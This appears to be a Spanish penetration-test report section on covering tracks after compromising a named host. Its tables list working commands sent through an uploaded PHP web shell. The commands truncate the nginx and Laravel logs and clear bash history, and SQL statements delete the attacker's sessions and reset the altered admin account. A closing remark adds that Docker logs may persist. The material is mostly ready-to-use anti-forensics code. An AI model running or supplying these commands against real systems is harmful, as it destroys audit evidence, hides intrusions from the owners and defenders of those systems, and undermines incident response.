# Fase 5 - Borrado de Huellas (Covering Tracks)

**Fase PTES:** Eliminación de evidencia y logs para evitar detección.
**Target:** http://37.60.230.11

---

## Logs eliminados

| Archivo | Acción | Comando |
|---------|--------|---------|
| `/var/log/nginx/access.log` | Limpiado (truncado) | `curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"` |
| `/var/log/nginx/error.log` | Limpiado (truncado) | `curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"` |
| `/var/www/html/storage/logs/laravel.log` | Limpiado (truncado) | `curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"` |
| `~/.bash_history` | Limpiado | `curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"` |

---

## Registros modificados

| Ubicación | Cambio | Comando |
|-----------|--------|---------|
| Tabla `users` (BD PostgreSQL) | Usuario `admin` (real) modificado: email y contraseña restaurados | `UPDATE users SET email='admin@example.com', password='<hash_original>' WHERE email LIKE 'admin%@example.com';` |
| Tabla `sessions` (BD PostgreSQL) | Sesiones del atacante eliminadas | `DELETE FROM sessions WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'admin3%');` |
| `/var/www/html/uploads/shell.php` | Eliminado (opcional, según necesidad) | `curl -s "http://37.60.230.11/uploads/shell.php?cmd=rm%20/var/www/html/uploads/shell.php"` |

---

## Notas adicionales

- Se recomienda eliminar el archivo `shell.php` al finalizar la auditoría para no dejar el sistema comprometido.
- Los logs de Docker (historial de contenedor) pueden persistir incluso si se truncan los archivos internos. Para limpieza total, debe reiniciarse el contenedor o el host Docker.
- No se modificaron registros del sistema operativo más allá de bash_history y logs de aplicación.
```
